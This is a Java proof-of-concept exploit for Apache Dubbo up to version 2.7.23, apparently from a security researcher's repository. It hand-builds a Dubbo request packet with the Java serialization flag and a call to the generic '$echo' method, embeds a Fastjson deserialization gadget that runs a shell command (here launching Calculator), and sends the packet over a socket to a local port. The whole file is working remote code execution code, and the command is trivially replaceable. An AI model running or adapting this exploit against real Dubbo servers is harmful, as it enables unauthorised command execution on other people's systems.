package org.example;

import org.apache.dubbo.common.io.Bytes;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

/**
 * @author Whoopsunix
 *
 * <= 2.7.23
 */
public class EXP {
    public static void main(String[] args) throws Exception {
        Object o = GadgetBuilder.fastjson("open -a Calculator.app");

        // header.
        byte[] header = new byte[16];

        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);

        // set request and serialization flag.
        // 2 -> "hessian2"
        // 3 -> "java"
        // 4 -> "compactedjava"
        // 6 -> "fastjson"
        // 7 -> "nativejava"
        // 8 -> "kryo"
        // 9 -> "fst"
        // 10 -> "native-hessian"
        // 11 -> "avro"
        // 12 -> "protostuff"
        // 16 -> "gson"
        // 21 -> "protobuf-json"
        // 22 -> "protobuf"
        // 25 -> "kryo2"
        header[2] = (byte) (0x80 | 3 | 0x40);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        /* For Requests, we need to encode the following objects
              1.dubboVersion
              2.path
              3.version
              4.methodName
              5.methodDesc
              6.paramsObject
              7.map
            */
        oos.writeInt(666);
        oos.writeUTF("0.0.0");
        oos.writeInt(666);
        oos.writeUTF("org.example.api.DemoService");
        oos.writeInt(666);
        oos.writeUTF("0.0.0");
        oos.writeInt(666);
        oos.writeUTF("$echo");
        oos.writeInt(666);
        oos.writeUTF("Ljava/lang/Object;");
        oos.writeByte(666);
        oos.writeObject(o);
        oos.close();

        Bytes.int2bytes(baos.size(), header, 12);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(baos.toByteArray());
        byte[] bytes = byteArrayOutputStream.toByteArray();

        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}








